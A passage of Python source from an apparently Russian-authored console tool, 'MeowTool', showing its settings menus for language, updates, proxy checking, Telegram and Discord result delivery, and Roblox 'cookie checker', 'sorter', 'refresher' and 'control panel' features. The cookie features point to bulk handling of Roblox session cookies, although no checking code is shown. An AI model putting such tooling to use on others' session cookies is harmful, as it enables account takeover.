                                                open(f'Roblox\\Misc\\All gamepasses and badges from program\\Gamepasses\\{place.placeNames[3]} ({sub(r'[\/:*?"<>|]', '', place.placeNames[0])}).txt', 'w', encoding='UTF-8').write(f'\n  Meow :3\n\n  {MT_Place_ID}: {place.placeNames[3]}\n  {MT_Place_Name}: {place.placeNames[0]}\n  {MT_Place_Link}: https://www.roblox.com/games/{place.placeNames[3]}\n\n  [*] {MT_Gamepasses}\n{columnar(uploadAllGamepassesAndBadges, columnarHeaders, no_borders=True)}')
                                            uploadAllGamepassesAndBadges = []
                                            if getattr(place, 'Badges', False):
                                                for badge in place.Badges.listOfBadges:
                                                    uploadAllGamepassesAndBadges.append([badge[1], badge[0], f'https://www.roblox.com/badges/{badge[1]}'])
                                                os.makedirs('Roblox\\Misc\\All gamepasses and badges from program\\Badges', exist_ok=True)
                                                open(f'Roblox\\Misc\\All gamepasses and badges from program\\Badges\\{place.placeNames[3]} ({sub(r'[\/:*?"<>|]', '', place.placeNames[0])}).txt', 'w', encoding='UTF-8').write(f'\n  Meow :3\n\n  {MT_Place_ID}: {place.placeNames[3]}\n  {MT_Place_Name}: {place.placeNames[0]}\n  {MT_Place_Link}: https://www.roblox.com/games/{place.placeNames[3]}\n\n  [*] {MT_Badges}\n{columnar(uploadAllGamepassesAndBadges, columnarHeaders, no_borders=True)}')    
                                        await errorOrCorrectHandler(False, 9, f'{MT_Successfully_Uploaded_In} \'Roblox\\Misc\\All gamepasses and badges from program\'', f'{MT_Roblox}\\{MT_Misc}')
                                    case '0':
                                        whileTrueStage2 = False
                                        await removeLines(9)
                                    case 'F' | 'А':
                                        await cls()
                                        await lableASCII()
                                    case 'R' | 'К':
                                        loadConfig(configLoader['Loader']['Current_Config'])
                                        await removeLines(9)
                                    case _:
                                        await removeLines(9)
                        case '0':
                            whileTrueStage1 = False
                            await removeLines(12)
                        case 'F' | 'А':
                            await cls()
                            await lableASCII()
                        case 'R' | 'К':
                            loadConfig(configLoader['Loader']['Current_Config'])
                            await removeLines(12)
                        case _:
                            await removeLines(12)
            # Настройки
            case 's' | 'S' | 'ы' | 'Ы':
                whileTrueStage1 = True
                await removeLines(amountRemoveLines)
                while whileTrueStage1:
                    sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_General}\n [{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Proxy}\n [{ANSI.FG.PINK}3{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Roblox}\n [{ANSI.FG.PINK}4{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Configs}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                    settingsTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                    match settingsTab.upper():
                        # Общие
                        case '1':
                            whileTrueStage2 = True
                            await removeLines(10)
                            while whileTrueStage2:
                                sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_General}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Language}\n [{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Updates}\n [{ANSI.FG.PINK}3{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Console_Title}: {config['General']['Console_Title'][:50]}\n [{ANSI.FG.PINK}4{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['General']['Show_Lable_MeowTool'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Show_Lable_MeowTool}\n [{ANSI.FG.PINK}5{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['General']['Show_Lable_by_h1kken'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Show_Lable_by_h1kken}\n [{ANSI.FG.PINK}6{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Key_To_Continue}: {MT_Any if config['General']['Press_Any_Key_To_Continue'] else 'Enter'}\n [{ANSI.FG.PINK}7{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['General']['Disable_Warnings_For_Links'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Disable_Warnings_For_Links}\n [{ANSI.FG.PINK}8{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['General']['Disable_Warnings_For_Dangerous_Actions'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Disable_Warnings_For_Dangerous_Actions}\n [{ANSI.FG.PINK}9{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Fix_Console} ({MT_Bind}: F)\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                settingsGeneralTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                match settingsGeneralTab.upper():
                                    # Язык
                                    case '1':
                                        whileTrueStage3 = True
                                        await removeLines(15)
                                        while whileTrueStage3:
                                            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_General}\\{MT_Language}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if str(config['General']['Language']).upper() == 'RU' else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} Русский\n [{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if str(config['General']['Language']).upper() == 'EN' else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} English\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                            settingsLanguageTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                            match settingsLanguageTab.upper():
                                                case '1':
                                                    config['General']['Language'] = 'RU'
                                                    translateMT(config['General']['Language'])
                                                case '2':
                                                    config['General']['Language'] = 'EN'
                                                    translateMT(config['General']['Language'])
                                                case '0':
                                                    whileTrueStage3 = False
                                                case 'F' | 'А':
                                                    await cls()
                                                    await lableASCII()
                                                case 'R' | 'К':
                                                    loadConfig(configLoader['Loader']['Current_Config'])
                                                case _:
                                                    await removeLines(8)

                                            await autoSaveConfigAndRemoveLinesInSettings(settingsLanguageTab.upper(), ('1', '2'), ('0', 'R', 'К'), 8)
                                    # Обновления
                                    case '2':
                                        whileTrueStage3 = True
                                        await removeLines(15)
                                        while whileTrueStage3:
                                            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_General}\\{MT_Updates}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if configLoader['Updater']['Check_For_Updates'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Check_For_Updates}\n [{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if configLoader['Updater']['Save_Old_Versions'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Save_Old_Versions}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                            settingsUpdatesTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                            match settingsUpdatesTab.upper():
                                                case '1':
                                                    configLoader['Updater']['Check_For_Updates'] ^= True
                                                    open(f'Settings\\Configs\\.Loader.toml', 'w', encoding='UTF-8').write(dumps(configLoader))
                                                case '2':
                                                    configLoader['Updater']['Save_Old_Versions'] ^= True
                                                    open(f'Settings\\Configs\\.Loader.toml', 'w', encoding='UTF-8').write(dumps(configLoader))
                                                case '0':
                                                    whileTrueStage3 = False
                                                case 'F' | 'А':
                                                    await cls()
                                                    await lableASCII()
                                                case 'R' | 'К':
                                                    loadConfig(configLoader['Loader']['Current_Config'])
                                                case _:
                                                    await removeLines(8)

                                            await autoSaveConfigAndRemoveLinesInSettings(settingsUpdatesTab.upper(), ('1', '2'), ('0', 'R', 'К'), 8)
                                    case '3':
                                        await removeLines(13)
                                        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}?{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Do_Not_Use_Characters_Such_As}: >, <, |, ^, &\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}\n\n')
                                        settingsTitleEnter = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_A_New_Title}:{ANSI.CLEAR} ')

                                        async def changeConsoleTitle():
                                            if settingsTitleEnter == '0': return await removeLines(7)
                                            if settingsTitleEnter.replace(' ', '') == '':
                                                return await errorOrCorrectHandler(True, 7, MT_The_Name_Cannot_Be_Empty,                          f'{MT_Settings}\\{MT_General}')
                                            if len(settingsTitleEnter) > 100:
                                                return await errorOrCorrectHandler(True, 7, MT_Incorrect_Length_Of_Name_50,                      f'{MT_Settings}\\{MT_General}')
                                            if any(char in settingsTitleEnter for char in ['<', '>', '|', '^', '&']):
                                                return await errorOrCorrectHandler(True, 7, f'{MT_Do_Not_Use_Characters_Such_As}: <, >, |, ^, &', f'{MT_Settings}\\{MT_General}')

                                            os.system(f'title {settingsTitleEnter}')
                                            config['General']['Console_Title'] = settingsTitleEnter
                                            await autoSaveConfig()
                                            await removeLines(7)

                                        await changeConsoleTitle()
                                    case '4':
                                        config['General']['Show_Lable_MeowTool'] ^= True
                                        await autoSaveConfig()
                                        await cls()
                                        await lableASCII()
                                    case '5':
                                        config['General']['Show_Lable_by_h1kken'] ^= True
                                        await autoSaveConfig()
                                        await cls()
                                        await lableASCII()
                                    case '6':
                                        config['General']['Press_Any_Key_To_Continue'] ^= True
                                    case '7':
                                        config['General']['Disable_Warnings_For_Links'] ^= True
                                    case '8':
                                        config['General']['Disable_Warnings_For_Dangerous_Actions'] ^= True
                                    case '9' | 'F' | 'А':
                                        await cls()
                                        await lableASCII()
                                    case '0':
                                        whileTrueStage2 = False
                                    case 'R' | 'К':
                                        loadConfig(configLoader['Loader']['Current_Config'])
                                    case _:
                                        await removeLines(15)

                                await autoSaveConfigAndRemoveLinesInSettings(settingsGeneralTab.upper(), ('6', '7', '8'), ('0', 'R', 'К'), 15)
                        # Прокси
                        case '2':
                            whileTrueStage2 = True
                            await removeLines(10)
                            while whileTrueStage2:
                                sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Proxy}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Checker}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                settingsProxyTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                match settingsProxyTab.upper():
                                    # Прокси Чекер (PC)
                                    case '1':
                                        whileTrueStage3 = True
                                        await removeLines(7)
                                        while whileTrueStage3:
                                            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Proxy}\\{MT_Checker}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Waiting_Time}: {int(config['Proxy']['Checker']['Timeout'])} {MT_Seconds}.\n {ANSI.CLEAR + ANSI.DECOR.BOLD}[{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Proxy']['Checker']['Save_In_Custom_Folder'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Save_In} custom_valid.txt\n {ANSI.CLEAR + ANSI.DECOR.BOLD}[{ANSI.FG.PINK}3{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Proxy']['Checker']['Save_Without_Protocol'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Save_Without_Protocol}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                            settingsPCTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                            match settingsPCTab.upper():
                                                case '1':
                                                    await removeLines(9)
                                                    sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Proxy}\\{MT_Checker}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Cancel}{ANSI.CLEAR}\n\n')
                                                    settingsPCTimeoutChange = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_The_Waiting_Time}:{ANSI.CLEAR} ')

                                                    async def changeProxyTimeout():
                                                        if settingsPCTimeoutChange == '0': return await removeLines(5)
                                                        if not settingsPCTimeoutChange.isdigit():
                                                            return await errorOrCorrectHandler(True, 5, MT_Incorrect_Value,        f'{MT_Settings}\\{MT_Proxy}\\{MT_Checker}')
                                                        if int(settingsPCTimeoutChange) > 3600:
                                                            return await errorOrCorrectHandler(True, 5, MT_Incorrect_Waiting_Time, f'{MT_Settings}\\{MT_Proxy}\\{MT_Checker}')

                                                        config['Proxy']['Checker']['Timeout'] = int(settingsPCTimeoutChange)
                                                        await autoSaveConfig()
                                                        await removeLines(5)

                                                    await changeProxyTimeout()
                                                case '2':
                                                    config['Proxy']['Checker']['Save_In_Custom_Folder'] ^= True
                                                case '3':
                                                    config['Proxy']['Checker']['Save_Without_Protocol'] ^= True
                                                case '0':
                                                    whileTrueStage3 = False
                                                case 'F' | 'А':
                                                    await cls()
                                                    await lableASCII()
                                                case 'R' | 'К':
                                                    loadConfig(configLoader['Loader']['Current_Config'])
                                                case _:
                                                    await removeLines(9)

                                            await autoSaveConfigAndRemoveLinesInSettings(settingsPCTab.upper(), ('2', '3'), ('0', 'R', 'К'), 9)
                                    case '0':
                                        whileTrueStage2 = False
                                        await removeLines(7)
                                    case 'F' | 'А':
                                        await cls()
                                        await lableASCII()
                                    case 'R' | 'К':
                                        loadConfig(configLoader['Loader']['Current_Config'])
                                        await removeLines(7)
                                    case _:
                                        await removeLines(7)
                        # Роблокс
                        case '3':
                            whileTrueStage2 = True
                            await removeLines(10)
                            while whileTrueStage2:
                                sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_General}\n [{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Cookie_Checker}\n [{ANSI.FG.PINK}3{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Cookie_Sorter}\n [{ANSI.FG.PINK}4{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Cookie_Refresher}\n [{ANSI.FG.PINK}5{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Transaction_Analysis}\n [{ANSI.FG.PINK}6{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Cookie_Control_Panel}\n [{ANSI.FG.PINK}7{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Misc}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                settingsRobloxTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                match settingsRobloxTab.upper():
                                    # Общее
                                    case '1':
                                        whileTrueStage3 = True
                                        await removeLines(13)
                                        while whileTrueStage3:
                                            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_General}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['General']['Show_Amount_Of_Lines_In_Files'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Show_Amount_Of_Lines_In_Files}\n {ANSI.CLEAR + ANSI.DECOR.BOLD}[{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['General']['Play_Sound_At_The_End_Of_The_Work'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Play_The_Sound_At_The_End_Of_The_Work}\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}3{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Outputs}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                            settingsRobloxGeneralTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                            match settingsRobloxGeneralTab.upper():
                                                case '1':
                                                    config['Roblox']['General']['Show_Amount_Of_Lines_In_Files'] ^= True
                                                case '2':
                                                    config['Roblox']['General']['Play_Sound_At_The_End_Of_The_Work'] ^= True
                                                    if config['Roblox']['General']['Play_Sound_At_The_End_Of_The_Work']: await playOSSound()
                                                case '3':
                                                    whileTrueStage4 = True
                                                    await removeLines(9)
                                                    while whileTrueStage4:
                                                        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_General}\\{MT_Outputs}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['General']['Outputs']['Send_Results_To_Telegram_Bot'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Telegram_Bot}\n [{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['General']['Outputs']['Send_Results_To_Discord_Webhook'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Discord_Webhook}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                                        settingsRobloxGeneralOutputsTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                                        match settingsRobloxGeneralOutputsTab.upper():
                                                            case '1':
                                                                whileTrueStage5 = True
                                                                await removeLines(8)
                                                                while whileTrueStage5:
                                                                    sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_General}\\{MT_Outputs}\\{MT_Telegram_Bot}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Specify} {MT_Bot_Token.lower()}' if not str(config['Roblox']['General']['Outputs']['Telegram_Bot_Token']) else f'{MT_Bot_Token}: {config['Roblox']['General']['Outputs']['Telegram_Bot_Token']}'}\n [{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'{MT_Specify} {MT_Chat_ID[1]}' if not str(config['Roblox']['General']['Outputs']['Telegram_Bot_Chat_ID']) else f'{MT_Chat_ID[0]}: {config['Roblox']['General']['Outputs']['Telegram_Bot_Chat_ID']}'}\n [{ANSI.FG.PINK}3{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Search_Chat_ID}\n [{ANSI.FG.PINK}4{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ Meow...\n [{ANSI.FG.PINK}5{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['General']['Outputs']['Send_Results_To_Telegram_Bot'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Send[0]} {MT_Results_To_Telegram[0].lower() + MT_Results_To_Telegram[1:]}\n  ┃\n [{ANSI.FG.YELLOW}C{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Create_A_Telegram_Bot}\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                                                    settingsRobloxGeneralOutputsTGTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                                                    match settingsRobloxGeneralOutputsTGTab.upper():
                                                                        case '1':
                                                                            await removeLines(10)
                                                                            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}\n\n')
                                                                            settingsRobloxGeneralOutputsTGBotTokenEnter = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_A_Bot_Token}:{ANSI.CLEAR} ')

                                                                            async def changeTelegramBotToken():
                                                                                if settingsRobloxGeneralOutputsTGBotTokenEnter == '0': return await removeLines(5)
                                                                                if settingsRobloxGeneralOutputsTGBotTokenEnter.strip() == '':
                                                                                    return await errorOrCorrectHandler(True, 5, MT_Value_Cannot_Be_Empty, f'{MT_Settings}\\{MT_Roblox}\\{MT_General}\\{MT_Outputs}\\{MT_Telegram_Bot}')

                                                                                config['Roblox']['General']['Outputs']['Telegram_Bot_Token'] = settingsRobloxGeneralOutputsTGBotTokenEnter
                                                                                await autoSaveConfig()
                                                                                await removeLines(5)

                                                                            await changeTelegramBotToken()
                                                                        case '2':
                                                                            await removeLines(10)
                                                                            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}\n\n')
                                                                            settingsRobloxGeneralOutputsTGChatIDEnter = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_A_Chat_ID}:{ANSI.CLEAR} ')

                                                                            async def changeTelegramChatID():
                                                                                if settingsRobloxGeneralOutputsTGChatIDEnter == '0': return await removeLines(5)
                                                                                if settingsRobloxGeneralOutputsTGChatIDEnter.strip() == '':
                                                                                    return await errorOrCorrectHandler(True, 5, MT_Value_Cannot_Be_Empty,        f'{MT_Settings}\\{MT_Roblox}\\{MT_General}\\{MT_Outputs}\\{MT_Telegram_Bot}')
                                                                                if not settingsRobloxGeneralOutputsTGChatIDEnter.isdigit():
                                                                                    return await errorOrCorrectHandler(True, 5, MT_Value_Must_Consist_Of_Digits, f'{MT_Settings}\\{MT_Roblox}\\{MT_General}\\{MT_Outputs}\\{MT_Telegram_Bot}')

                                                                                config['Roblox']['General']['Outputs']['Telegram_Bot_Chat_ID'] = settingsRobloxGeneralOutputsTGChatIDEnter
                                                                                await autoSaveConfig()
                                                                                await removeLines(5)

                                                                            await changeTelegramChatID()
                                                                        case '3':
                                                                            async def findChatID():
                                                                                if not config['Roblox']['General']['Outputs']['Telegram_Bot_Token']:
                                                                                    return await errorOrCorrectHandler(True, 12, f'{MT_Specify_The_Bot_Token}...', f'{MT_Settings}\\{MT_Roblox}\\{MT_General}\\{MT_Outputs}\\{MT_Telegram_Bot}')

                                                                                await removeLines(10)
                                                                                sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}~{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Wait[0]}...')

                                                                                try:
                                                                                    async with ClientSession() as session:
                                                                                        async with session.get(f'https://api.telegram.org/bot{config['Roblox']['General']['Outputs']['Telegram_Bot_Token']}/getUpdates') as response:
                                                                                            data = await response.json()

                                                                                    username = data['result'][-1]['message']['chat']['username']
                                                                                    await removeLines(1)
                                                                                    whileTrueStageChatID = True
                                                                                    while whileTrueStageChatID:
                                                                                        sys.stdout.write(f'\n {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}?{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_You[2]} {username}?{ANSI.CLEAR + ANSI.DECOR.BOLD}\n  ┃ \n [{ANSI.FG.GREEN}Y{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Yes}{ANSI.CLEAR + ANSI.DECOR.BOLD}\n [{ANSI.FG.RED}N{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_No}{ANSI.CLEAR}\n\n')
                                                                                        confirmTheAction = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
